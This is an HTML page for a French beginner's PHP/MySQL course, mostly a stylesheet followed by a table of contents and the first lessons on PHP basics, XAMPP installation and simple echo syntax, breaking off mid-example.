<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formation php</title>
    <style>
        /* === FORMATION PHP - CSS PROFESSIONNEL === */

/* Variables CSS pour la coh√©rence */
:root {
    --primary-color: #667eea;
    --secondary-color: #764ba2;
    --accent-color: #f093fb;
    --success-color: #4ecdc4;
    --warning-color: #ffe66d;
    --danger-color: #ff6b6b;
    --dark-color: #2c3e50;
    --light-color: #ffffff;
    --gray-50: #f8fafc;
    --gray-100: #f1f5f9;
    --gray-200: #e2e8f0;
    --gray-300: #cbd5e1;
    --gray-400: #94a3b8;
    --gray-500: #64748b;
    --gray-600: #475569;
    --gray-700: #334155;
    --gray-800: #1e293b;
    --gray-900: #0f172a;
    
    --border-radius-sm: 0.5rem;
    --border-radius-md: 0.75rem;
    --border-radius-lg: 1rem;
    --border-radius-xl: 1.5rem;
    
    --shadow-sm: 0 1px 2px 0 rgb(0 0 0 / 0.05);
    --shadow-md: 0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);
    --shadow-lg: 0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);
    --shadow-xl: 0 20px 25px -5px rgb(0 0 0 / 0.1), 0 8px 10px -6px rgb(0 0 0 / 0.1);
    --shadow-2xl: 0 25px 50px -12px rgb(0 0 0 / 0.25);
    
    --transition-fast: all 0.15s ease;
    --transition-normal: all 0.3s ease;
    --transition-slow: all 0.5s ease;
}

/* Reset moderne */
*,
*::before,
*::after {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

html {
    scroll-behavior: smooth;
    font-size: 16px;
}

body {
    font-family: 'Inter', 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    line-height: 1.7;
    color: var(--gray-800);
    background: linear-gradient(135deg, var(--primary-color) 0%, var(--secondary-color) 50%, var(--accent-color) 100%);
    background-attachment: fixed;
    min-height: 100vh;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
}

/* === HEADER FORMATION === */
.formation-php-header {
    background: linear-gradient(135deg, rgba(255,255,255,0.1), rgba(255,255,255,0.05));
    backdrop-filter: blur(20px);
    border: 1px solid rgba(255,255,255,0.2);
    border-radius: var(--border-radius-xl);
    color: var(--light-color);
    padding: 4rem 2rem;
    margin: 2rem auto;
    max-width: 1200px;
    text-align: center;
    box-shadow: var(--shadow-2xl);
    position: relative;
    overflow: hidden;
}

.formation-php-header::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: linear-gradient(45deg, transparent 30%, rgba(255,255,255,0.1) 50%, transparent 70%);
    transform: translateX(-100%);
    animation: shimmer 3s infinite;
}

@keyframes shimmer {
    100% { transform: translateX(100%); }
}

.image-logo-php {
    margin-bottom: 2rem;
}

.image-logo-php img {
    width: 100px;
    height: 100px;
    border-radius: 50%;
    border: 4px solid rgba(255,255,255,0.3);
    box-shadow: var(--shadow-xl);
    transition: var(--transition-normal);
}

.image-logo-php img:hover {
    transform: scale(1.1) rotate(5deg);
    border-color: var(--accent-color);
}

.formation-php-title {
    font-size: clamp(2.5rem, 5vw, 4rem);
    font-weight: 800;
    margin-bottom: 1.5rem;
    background: linear-gradient(135deg, var(--light-color), var(--accent-color));
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    letter-spacing: -0.02em;
}

.formation-php-description {
    font-size: 1.25rem;
    opacity: 0.9;
    max-width: 700px;
    margin: 0 auto;
    font-weight: 400;
    line-height: 1.6;
}

/* === LAYOUT PRINCIPAL === */
.formation-php {
    display: grid;
    grid-template-columns: 320px 1fr;
    gap: 3rem;
    max-width: 1400px;
    margin: 0 auto;
    padding: 2rem;
    min-height: calc(100vh - 200px);
}

/* === SOMMAIRE LATERAL === */
.sommaire-cours {
    background: rgba(255,255,255,0.95);
    backdrop-filter: blur(20px);
    border: 1px solid rgba(255,255,255,0.3);
    border-radius: var(--border-radius-xl);
    padding: 2rem;
    height: fit-content;
    position: sticky;
    top: 2rem;
    box-shadow: var(--shadow-xl);
    transition: var(--transition-normal);
}

.sommaire-cours:hover {
    transform: translateY(-2px);
    box-shadow: var(--shadow-2xl);
}

.sommaire-content {
    position: relative;
}

.sommaire-content::before {
    content: 'üìö';
    font-size: 2rem;
    display: block;
    text-align: center;
    margin-bottom: 1rem;
}

.sommaire-nav-links {
    list-style: none;
    display: grid;
    gap: 0.5rem;
}

.sommaire-nav-link {
    position: relative;
}

.sommaire-nav-link-iteme {
    display: block;
    padding: 1rem 1.5rem;
    color: var(--gray-700);
    text-decoration: none;
    border-radius: var(--border-radius-md);
    transition: var(--transition-fast);
    font-size: 0.95rem;
    font-weight: 500;
    border: 1px solid transparent;
    position: relative;
    overflow: hidden;
}

.sommaire-nav-link-iteme::before {
    content: '';
    position: absolute;
    top: 0;
    left: -100%;
    width: 100%;
    height: 100%;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
    transition: var(--transition-normal);
}

.sommaire-nav-link-iteme:hover {
    background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
    color: var(--light-color);
    transform: translateX(8px);
    border-color: var(--accent-color);
    box-shadow: var(--shadow-lg);
}

.sommaire-nav-link-iteme:hover::before {
    left: 100%;
}

.sommaire-nav-link-iteme:active {
    transform: translateX(8px) scale(0.98);
}

/* === CONTENU PRINCIPAL === */
.conten-course {
    background: rgba(255,255,255,0.95);
    backdrop-filter: blur(20px);
    border: 1px solid rgba(255,255,255,0.3);
    border-radius: var(--border-radius-xl);
    padding: 3rem;
    box-shadow: var(--shadow-xl);
    position: relative;
    overflow: hidden;
}

.conten-course::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    height: 4px;
    background: linear-gradient(90deg, var(--primary-color), var(--accent-color), var(--secondary-color));
}

/* === SECTIONS ET PARTIES === */
.section,
.part1-php-course,
.part2-php-course,
.part4-php-course,
.part5-php-course,
.part6,
.part7,
.part8,
.part9,
.part10,
.part11,
.part12,
.part13,
.part14,
.part15,
.part16,
.part17,
.part19,
.part20,
.troisieme-partie,
.quatrieme-partie {
    margin-bottom: 4rem;
    position: relative;
}

.section h1,
.section h2,
.part1-php-course h2,
.part2-php-course h2,
.part4-php-course h1,
.part5-php-course h1,
.part6 h2,
.part7 h2,
.part8 h2,
.part9 h2,
.part10 h2,
.part11 h2,
.part12 h2,
.part13 h2,
.part14 h2,
.part15 h2,
.part16 h2,
.part17 h2,
.part19 h2,
.part20 h2,
.header h1,
.header-part4 h1 {
    background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
    color: var(--light-color);
    padding: 2rem 2.5rem;
    border-radius: var(--border-radius-lg);
    margin-bottom: 2.5rem;
    font-size: clamp(1.5rem, 3vw, 2.2rem);
    font-weight: 700;
    box-shadow: var(--shadow-lg);
    position: relative;
    overflow: hidden;
    border: 1px solid rgba(255,255,255,0.2);
}

.section h1::after,
.section h2::after,
.part1-php-course h2::after,
.part2-php-course h2::after,
.part4-php-course h1::after,
.part5-php-course h1::after,
.part6 h2::after,
.part7 h2::after,
.part8 h2::after,
.part9 h2::after,
.part10 h2::after,
.part11 h2::after,
.part12 h2::after,
.part13 h2::after,
.part14 h2::after,
.part15 h2::after,
.part16 h2::after,
.part17 h2::after,
.part19 h2::after,
.part20 h2::after,
.header h1::after,
.header-part4 h1::after {
    content: '';
    position: absolute;
    top: 0;
    right: 0;
    width: 100px;
    height: 100%;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1));
    transform: skewX(-20deg);
}

.section h3,
.part1-php-course h3,
.part2-php-course h3,
.part4-php-course h3,
.part5-php-course h3,
.part6 h3,
.part7 h3,
.part8 h3,
.part9 h3,
.part10 h3,
.part11 h3,
.part12 h3,
.part13 h3,
.part14 h3,
.part15 h3,
.part16 h3,
.part17 h3,
.part19 h3,
.part20 h3 {
    color: var(--dark-color);
    font-size: 1.5rem;
    font-weight: 600;
    margin: 2.5rem 0 1.5rem 0;
    padding: 1rem 0 1rem 1.5rem;
    border-left: 4px solid var(--accent-color);
    background: linear-gradient(90deg, rgba(240, 147, 251, 0.1), transparent);
    border-radius: 0 var(--border-radius-md) var(--border-radius-md) 0;
    position: relative;
}

.section h4,
.part4-php-course h4,
.part5-php-course h4,
.part6 h4,
.part7 h4,
.part8 h4,
.part9 h4,
.part10 h4,
.part11 h4,
.part12 h4,
.part13 h4,
.part14 h4,
.part15 h4,
.part16 h4,
.part17 h4,
.part19 h4,
.part20 h4 {
    color: var(--gray-700);
    font-size: 1.25rem;
    font-weight: 600;
    margin: 2rem 0 1rem 0;
    padding: 0.75rem 0;
    border-bottom: 2px solid var(--gray-200);
}

.section h5,
.part4-php-course h5,
.part5-php-course h5,
.part6 h5,
.part7 h5,
.part8 h5,
.part9 h5,
.part10 h5,
.part11 h5,
.part12 h5,
.part13 h5,
.part14 h5,
.part15 h5,
.part16 h5,
.part17 h5,
.part19 h5,
.part20 h5 {
    color: var(--gray-600);
    font-size: 1.1rem;
    font-weight: 600;
    margin: 1.5rem 0 0.75rem 0;
}

/* === PARAGRAPHES ET TEXTE === */
p {
    margin-bottom: 1.5rem;
    line-height: 1.7;
    font-size: 1rem;
    color: var(--gray-700);
}

.intro-text {
    background: linear-gradient(135deg, var(--gray-50), var(--gray-100));
    border: 1px solid var(--gray-200);
    border-radius: var(--border-radius-lg);
    padding: 2rem;
    margin: 2rem 0;
    position: relative;
    font-size: 1.1rem;
    line-height: 1.6;
}

.intro-text::before {
    content: 'üí°';
    position: absolute;
    top: -10px;
    left: 20px;
    background: var(--light-color);
    padding: 0.5rem;
    border-radius: 50%;
    font-size: 1.2rem;
}

/* === BLOCS DE CODE === */
pre {
    background: var(--gray-900);
    color: var(--gray-100);
    padding: 2rem;
    border-radius: var(--border-radius-lg);
    overflow-x: auto;
    margin: 2rem 0;
    border: 1px solid var(--gray-700);
    box-shadow: var(--shadow-lg);
    position: relative;
    font-family: 'JetBrains Mono', 'Fira Code', 'Consolas', monospace;
    font-size: 0.9rem;
    line-height: 1.6;
}

pre::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    height: 3px;
    background: linear-gradient(90deg, var(--success-color), var(--warning-color), var(--danger-color));
}

code {
    background: var(--gray-100);
    color: var(--danger-color);
    padding: 0.25rem 0.5rem;
    border-radius: var(--border-radius-sm);
    font-family: 'JetBrains Mono', 'Fira Code', 'Consolas', monospace;
    font-size: 0.9em;
    border: 1px solid var(--gray-200);
}

pre code {
    background: none;
    color: inherit;
    padding: 0;
    border: none;
    font-size: inherit;
}

/* === COLORATION SYNTAXIQUE === */
.tag { color: #f39c12; }
.keyword { color: #3498db; }
.string { color: #2ecc71; }
.comment { color: #95a5a6; font-style: italic; }
.number { color: #e67e22; }

/* === BOITES D'INFORMATION === */
.info-box,
.explanation-box,
.warning-box,
.example-section,
.definition-content,
.installation-content-text,
.concept-title,
.tips-list {
    padding: 2rem;
    border-radius: var(--border-radius-lg);
    margin: 2rem 0;
    border: 1px solid;
    position: relative;
    box-shadow: var(--shadow-md);
}

.info-box {
    background: linear-gradient(135deg, #ebf8ff, #dbeafe);
    border-color: var(--primary-color);
    color: var(--gray-800);
}

.explanation-box {
    background: linear-gradient(135deg, #f0f9ff, #e0f2fe);
    border-color: #0ea5e9;
    color: var(--gray-800);
}

.warning-box {
    background: linear-gradient(135deg, #fffbeb, #fef3c7);
    border-color: var(--warning-color);
    color: var(--gray-800);
}

.example-section {
    background: linear-gradient(135deg, #f0fdf4, #dcfce7);
    border-color: var(--success-color);
    color: var(--gray-800);
}

.definition-content {
    background: linear-gradient(135deg, #fdf2f8, #fce7f3);
    border-color: #ec4899;
    color: var(--gray-800);
}

.installation-content-text {
    background: linear-gradient(135deg, #f8fafc, #f1f5f9);
    border-color: var(--gray-300);
    color: var(--gray-800);
}

.concept-title {
    background: linear-gradient(135deg, var(--accent-color), var(--primary-color));
    color: var(--light-color);
    font-weight: 700;
    font-size: 1.2rem;
    text-align: center;
    margin: 2.5rem 0 1.5rem 0;
}

/* === LISTES === */
ul, ol {
    margin: 1.5rem 0;
    padding-left: 2rem;
}

li {
    margin-bottom: 0.75rem;
    line-height: 1.6;
}

ul li::marker {
    color: var(--primary-color);
}

ol li::marker {
    color: var(--primary-color);
    font-weight: 600;
}

.tips-list ul {
    display: grid;
    gap: 1rem;
}

.tips-list li {
    background: rgba(255,255,255,0.7);
    padding: 1rem;
    border-radius: var(--border-radius-md);
    border-left: 4px solid var(--success-color);
    list-style: none;
    position: relative;
}

.tips-list li::before {
    content: '‚úì';
    position: absolute;
    left: -2px;
    top: 50%;
    transform: translateY(-50%);
    background: var(--success-color);
    color: white;
    width: 20px;
    height: 20px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 0.8rem;
    font-weight: bold;
}

/* === TABLEAUX === */
table {
    width: 100%;
    border-collapse: collapse;
    margin: 2rem 0;
    background: var(--light-color);
    border-radius: var(--border-radius-lg);
    overflow: hidden;
    box-shadow: var(--shadow-lg);
    border: 1px solid var(--gray-200);
}

th, td {
    padding: 1.25rem;
    text-align: left;
    border-bottom: 1px solid var(--gray-200);
}

th {
    background: linear-gradient(135deg, var(--gray-800), var(--gray-700));
    color: var(--light-color);
    font-weight: 600;
    font-size: 0.95rem;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}

tr:hover {
    background-color: var(--gray-50);
}

tr:last-child td {
    border-bottom: none;
}

.operator-table {
    font-family: 'JetBrains Mono', monospace;
    font-size: 0.9rem;
}

/* === SECTIONS SP√âCIALES === */
.test-section {
    background: linear-gradient(135deg, var(--gray-50), rgba(255,255,255,0.8));
    border: 2px dashed var(--primary-color);
    border-radius: var(--border-radius-xl);
    padding: 2.5rem;
    margin: 3rem 0;
    text-align: center;
    position: relative;
    box-shadow: var(--shadow-md);
}

.test-section::before {
    content: 'üß™';
    position: absolute;
    top: -15px;
    left: 50%;
    transform: translateX(-50%);
    background: var(--light-color);
    padding: 0.5rem;
    border-radius: 50%;
    font-size: 1.5rem;
    border: 2px solid var(--primary-color);
}

.test-section h3 {
    color: var(--primary-color) !important;
    margin-bottom: 1.5rem;
    border: none !important;
    background: none !important;
    padding: 0 !important;
}

.result-box {
    background: var(--gray-900);
    color: var(--gray-100);
    padding: 1.5rem;
    border-radius: var(--border-radius-md);
    margin: 1.5rem 0;
    font-family: 'JetBrains Mono', monospace;
    border-left: 4px solid var(--success-color);
    box-shadow: var(--shadow-md);
}

.url-highlight {
    background: var(--gray-900);
    color: var(--success-color);
    padding: 1rem 1.5rem;
    border-radius: var(--border-radius-md);
    font-family: 'JetBrains Mono', monospace;
    margin: 1.5rem 0;
    border: 1px solid var(--gray-700);
    display: inline-block;
}

/* === LIENS === */
a {
    color: var(--primary-color);
    text-decoration: none;
    font-weight: 500;
    transition: var(--transition-fast);
    position: relative;
}

a:hover {
    color: var(--secondary-color);
}

a::after {
    content: '';
    position: absolute;
    bottom: -2px;
    left: 0;
    width: 0;
    height: 2px;
    background: var(--accent-color);
    transition: var(--transition-fast);
}

a:hover::after {
    width: 100%;
}

/* === DETAILS/SUMMARY === */
details {
    background: var(--light-color);
    border-radius: var(--border-radius-lg);
    margin: 2rem 0;
    border: 1px solid var(--gray-200);
    box-shadow: var(--shadow-md);
    overflow: hidden;
}

summary {
    background: linear-gradient(135deg, var(--gray-700), var(--gray-600));
    color: var(--light-color);
    padding: 1.5rem 2rem;
    cursor: pointer;
    font-weight: 600;
    font-size: 1.1rem;
    transition: var(--transition-normal);
    display: flex;
    align-items: center;
    gap: 1rem;
}

summary:hover {
    background: linear-gradient(135deg, var(--gray-600), var(--gray-500));
}

summary::before {
    content: 'üí°';
    font-size: 1.2rem;
}

details[open] summary {
    border-bottom: 1px solid var(--gray-200);
}

details > div {
    padding: 2rem;
}

/* === ANIMATIONS === */
@keyframes fadeInUp {
    from {
        opacity: 0;
        transform: translateY(30px);
    }
    to {
        opacity: 1;
        transform: translateY(0);
    }
}

@keyframes slideInRight {
    from {
        opacity: 0;
        transform: translateX(30px);
    }
    to {
        opacity: 1;
        transform: translateX(0);
    }
}

.section {
    animation: fadeInUp 0.6s ease-out;
}

.sommaire-cours {
    animation: slideInRight 0.8s ease-out;
}

.celebration {
    font-size: 1.3em;
    display: inline-block;
    animation: bounce 1s infinite;
}

@keyframes bounce {
    0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
    40% { transform: translateY(-10px); }
    60% { transform: translateY(-5px); }
}

/* === RESPONSIVE DESIGN === */
@media (max-width: 1200px) {
    .formation-php {
        grid-template-columns: 280px 1fr;
        gap: 2rem;
    }
    
    .formation-php-header {
        padding: 3rem 1.5rem;
    }
}

@media (max-width: 768px) {
    .formation-php {
        grid-template-columns: 1fr;
        gap: 1.5rem;
        padding: 1rem;
    }
    
    .sommaire-cours {
        position: static;
        order: 2;
        padding: 1.5rem;
    }
    
    .conten-course {
        order: 1;
        padding: 2rem;
    }
    
    .formation-php-header {
        padding: 2rem 1rem;
        margin: 1rem;
    }
    
    .formation-php-title {
        font-size: 2.5rem;
    }
    
    .formation-php-description {
        font-size: 1.1rem;
    }
    
    .section h1,
    .section h2,
    .header h1 {
        padding: 1.5rem;
        font-size: 1.8rem;
    }
    
    .section h3 {
        font-size: 1.3rem;
        padding: 0.75rem 0 0.75rem 1rem;
    }
    
    pre {
        padding: 1.5rem;
        font-size: 0.85rem;
        overflow-x: auto;
    }
    
    .info-box,
    .explanation-box,
    .warning-box,
    .example-section {
        padding: 1.5rem;
    }
    
    .test-section {
        padding: 2rem;
    }
}

@media (max-width: 480px) {
    body {
        font-size: 0.9rem;
    }
    
    .formation-php-header {
        padding: 1.5rem 0.75rem;
    }
    
    .formation-php-title {
        font-size: 2rem;
    }
    
    .conten-course {
        padding: 1.5rem;
    }
    
    .section h1,
    .section h2 {
        font-size: 1.5rem;
        padding: 1rem;
    }
    
    .section h3 {
        font-size: 1.2rem;
    }
    
    pre {
        padding: 1rem;
        font-size: 0.8rem;
    }
    
    .info-box,
    .explanation-box,
    .warning-box,
    .example-section {
        padding: 1rem;
    }
    
    table {
        font-size: 0.85rem;
    }
    
    th, td {
        padding: 0.75rem;
    }
}

/* === SCROLLBAR PERSONNALIS√âE === */
::-webkit-scrollbar {
    width: 8px;
    height: 8px;
}

::-webkit-scrollbar-track {
    background: var(--gray-100);
    border-radius: 4px;
}

::-webkit-scrollbar-thumb {
    background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
    border-radius: 4px;
}

::-webkit-scrollbar-thumb:hover {
    background: linear-gradient(135deg, var(--secondary-color), var(--accent-color));
}

/* === PRINT STYLES === */
@media print {
    body {
        background: white !important;
        color: black !important;
    }
    
    .formation-php-header,
    .sommaire-cours,
    .conten-course {
        background: white !important;
        color: black !important;
        box-shadow: none !important;
        border: 1px solid #ddd !important;
    }
    
    .formation-php {
        grid-template-columns: 1fr;
        gap: 1rem;
    }
    
    pre {
        background: #f5f5f5 !important;
        color: black !important;
        border: 1px solid #ddd !important;
    }
    
    .info-box,
    .explanation-box,
    .warning-box,
    .example-section {
        background: #f9f9f9 !important;
        border: 1px solid #ddd !important;
        color: black !important;
    }
    
    .section h1,
    .section h2 {
        background: #f0f0f0 !important;
        color: black !important;
    }
    
    a {
        color: black !important;
        text-decoration: underline !important;
    }
}

/* === UTILITAIRES === */
.text-center { text-align: center; }
.text-left { text-align: left; }
.text-right { text-align: right; }

.mt-1 { margin-top: 0.5rem; }
.mt-2 { margin-top: 1rem; }
.mt-3 { margin-top: 1.5rem; }
.mt-4 { margin-top: 2rem; }

.mb-1 { margin-bottom: 0.5rem; }
.mb-2 { margin-bottom: 1rem; }
.mb-3 { margin-bottom: 1.5rem; }
.mb-4 { margin-bottom: 2rem; }

.p-1 { padding: 0.5rem; }
.p-2 { padding: 1rem; }
.p-3 { padding: 1.5rem; }
.p-4 { padding: 2rem; }
    </style>
</head>
<body>
    <div class="formation-php-header">
        <div class="image-logo-php">
            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR2FrgWpuOnMmIdN-OTGQNN4OUiS9L-3dsS9Q&s" alt="">
        </div>
        <h1 class="formation-php-title">Formation php</h1>
        <p class="formation-php-description">
            Cette formation est d√©di√©e √† l'apprentissage du langage PHP et MySql, un langage de script c√¥t√© serveur largement utilis√© pour le d√©veloppement web.
        </p>
    </div>
    <div class="formation-php">
        <aside class="sommaire-cours">
        <div class="sommaire-content">
            <ol class="sommaire-nav-links">
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">1. Introduction au langage PHP</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">2. Installation de l‚Äôenvironnement (XAMPP, WAMP, Laragon)</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">3. Syntaxe de base et premier script PHP</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">4. Variables, constantes et types de donn√©es</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">5. Op√©rateurs et expressions</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">6. Structures conditionnelles (if, else, switch)</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">7. Boucles (while, for, foreach)</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">8. Fonctions et port√©e des variables</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">9. Tableaux (simples et associatifs)</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">10. Introduction √† MySQL et √† phpMyAdmin</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">11. Connexion PHP √† MySQL (PDO ou MySQLi)</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">12. Requ√™tes SQL : SELECT, INSERT, UPDATE, DELETE</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">13. Formulaires HTML et traitement en PHP</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">14. Validation et s√©curisation des donn√©es</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">15. Sessions et cookies</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">16. Upload de fichiers en PHP</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">17. Notions de programmation orient√©e objet (POO)</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">18. CRUD complet en PHP/MySQL</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">19. Architecture MVC simplifi√©e</a>
                </li>
                <li class="sommaire-nav-link">
                    <a href="#" class="sommaire-nav-link-iteme">20. Bonnes pratiques et s√©curit√© (hash, injection SQL, XSS)</a>
                </li>
            </ol>
        </div>
        </aside>

        <main class="conten-course">
            <div class="conten-php-course">
                <div class="part1-php-course">
                    <h2>Premi√®re partie : Introduction au langage PHP</h2>
                    <div class="introduction-content">
                        <p>Dans cette premi√®re partie, nous allons explorer les bases du langage PHP et comprendre ce qu‚Äôest r√©ellement ce langage.</p>
                        <b>D√©finition de PHP</b>
                        <div class="definition-content">
                            <p>PHP (Hypertext Preprocessor) est un langage de script c√¥t√© serveur, principalement utilis√© pour le d√©veloppement web. Il permet de cr√©er des pages web dynamiques et interactives en int√©grant du code dans des fichiers HTML.</p>
                            <p>PHP est open source, ce qui signifie qu'il est librement disponible et peut √™tre modifi√© par les d√©veloppeurs. Il est compatible avec de nombreux syst√®mes d'exploitation et serveurs web, ce qui en fait un choix populaire pour les d√©veloppeurs web.</p>
                            <p>Vous entendrez dire que PHP est un langage d√©pass√© et qu'il est vieux. Mais sachez qu'il continue d'√©voluer et de s'am√©liorer avec le temps, et qu'il reste largement utilis√© dans l'industrie.</p>
                            <p>PHP est souvent utilis√© en conjonction avec des bases de donn√©es, comme MySQL, pour stocker et r√©cup√©rer des donn√©es. Il offre √©galement de nombreuses fonctionnalit√©s pour la gestion des sessions, la manipulation de fichiers, et bien plus encore.</p>
                        </div>
                    </div>
                </div>
                <div class="part2-php-course">
                    <h2>Deuxi√®me partie : Installation de l‚Äôenvironnement PHP</h2>
                    <div class="installation-php">
                        <h3 class="installation-php-en-local">Installation de PHP en local</h3>
                        <div class="installation-content-text">
                            <p>Pour commencer √† d√©velopper en PHP, il est n√©cessaire d'installer un environnement de d√©veloppement local. Cela inclut g√©n√©ralement un serveur web (comme Apache), PHP lui-m√™me, et un SGBD (Syst√®me de Gestion de Base de Donn√©es) comme MySQL pour g√©rer les donn√©es.</p>
                            <p>Rappelez-vous que PHP est un langage c√¥t√© serveur, ce qui signifie qu'il s'ex√©cute sur le serveur et g√©n√®re du HTML qui est ensuite envoy√© au navigateur de l'utilisateur.</p>
                            <b><p>Il existe plusieurs solutions pour installer PHP en local, parmi lesquelles :</p></b>
                            
                            <h3 class="Windows">Installation de PHP sur Windows</h3>
                            <div class="windows-installation-content">
                                <p>Pour installer PHP sur Windows, vous pouvez utiliser des solutions comme XAMPP, WAMP ou MAMP, qui incluent PHP, MySQL et Apache dans un seul package.</p>
                                <p>Pour notre part et pour cette formation, nous allons utiliser XAMPP. Pour plus de d√©tails sur XAMPP, <span><a href="#">cliquez ici</a></span>.</p>
                                <h4>Voici les √©tapes g√©n√©rales pour installer PHP sur Windows :</h4>
                                <ol>
                                    <li>T√©l√©chargez le package XAMPP depuis le site officiel.</li>
                                    <li>Ex√©cutez l'installateur et suivez les instructions √† l'√©cran.</li>
                                    <li>Une fois l'installation termin√©e, lancez le panneau de contr√¥le XAMPP.</li>
                                    <li>D√©marrez les services Apache et MySQL.</li>
                                    <li>Acc√©dez √† votre navigateur pr√©f√©r√©, ouvrez un nouvel onglet et tapez "localhost".</li>
                                </ol>
                                <p>Vous verrez alors la page d'accueil de XAMPP s'afficher sur votre navigateur.</p>
                                <i>Vous pouvez maintenant commencer √† d√©velopper vos applications PHP en pla√ßant vos fichiers dans le r√©pertoire "htdocs".</i>
                                <p>Si vous rencontrez un probl√®me, alors pas de panique, faites une capture d‚Äô√©cran et envoyez-la via ce formulaire : <span><a href="#">ma page ne s'affiche pas</a></span>.</p>
                            </div>
                        </div>
                    </div>
                    <section class="troisieme-partie">
                          <div class="section-container">
                                <div class="header">
                                    <h1>Syntaxe de base et premier script PHP</h1>
                                    <p>Troisi√®me partie : Ma√Ætrisez les fondamentaux</p>
                                </div>
                                
                                <div class="content">
                                    <div class="intro-text">
                                        Dans cette partie, tu vas apprendre la syntaxe fondamentale du langage PHP et √©crire ton tout premier script interactif !
                                    </div>

                                    <div class="section">
                                        <h3>Ouverture et fermeture des balises PHP</h3>
                                        <p>Un script PHP commence toujours par <code>&lt;?php</code> et se termine par <code>?&gt;</code>. C'est comme ouvrir et fermer une porte vers le monde PHP !</p>
                                        <div class="code-block">
                                            <span class="tag">&lt;?php</span>
                                            <span class="comment">// Ceci est un commentaire</span>
                                            <span class="keyword">echo</span> <span class="string">"Bonjour le monde !"</span>;
                                            <span class="tag">?&gt;</span>
                                        </div>
                                        <p>Tout code PHP doit √™tre √©crit entre ces balises magiques. En dehors, c'est du HTML classique !</p>
                                    </div>

                                    <div class="section">
                                        <h3>Afficher du contenu avec <code>echo</code></h3>
                                        <p>La commande <code>echo</code> est ton meilleur ami pour afficher des informations √† l'√©cran. C'est simple et puissant !</p>
                                        <div class="code-block">
                                            <span class="tag">&lt;?php</span>
                                            <span class="keyword">echo</span> <span class="string">"Bienvenue dans le monde de PHP !"</span>;
                                            <span class="keyword">echo</span> <span class="string">"Tu vas devenir un expert !"</span>;
                                            <span class="tag">?&gt;</span>
                                        </div>
                                    </div>

                                    <div class="section">
                                        <h3>Commentaires en PHP</h3>
                                        <p>Les commentaires sont essentiels pour documenter ton code. Voici les trois fa√ßons de les √©crire :</p>
                                        <div class="code-block">
                                            <span class="tag">&lt;?php</span>
                                            <span class="comment">// Ceci est un commentaire sur une ligne</span>
                                            <span class="comment"># Ceci est aussi un commentaire sur une ligne</span>
                                            <span class="comment">/* 
                                            Ceci est un commentaire 
                                            sur plusieurs lignes 
                                            */</span>
                                            <span class="keyword">echo</span> <span class="string">"Les commentaires n'apparaissent pas √† l'√©cran !"</span>;
                                            <span class="tag">?&gt;</span>
                                        </div>
                                    </div>

                                    <div class="section">
                                        <h3>Int√©gration HTML + PHP</h3>
                                        <p>Voici la vraie magie : m√©langer HTML et PHP dans le m√™me fichier !</p>
                                        <div class="code-block html-block">
                                            <span class="tag">&lt;!DOCTYPE html&gt;
                                            &lt;html lang="fr"&gt;
                                            &lt;head&gt;
                                                &lt;title&gt;</span>Ma premi√®re page PHP<span class="tag">&lt;/title&gt;
                                                &lt;style&gt;
                                                    body { font-family: Arial; background: #f0f8ff; }
                                                    h1 { color: #333; text-align: center; }
                                                &lt;/style&gt;
                                            &lt;/head&gt;
                                            &lt;body&gt;
                                                &lt;h1&gt;</span><span class="keyword">&lt;?php echo</span> <span class="string">"Bonjour, PHP dynamique !"</span>; <span class="keyword">?&gt;</span><span class="tag">&lt;/h1&gt;
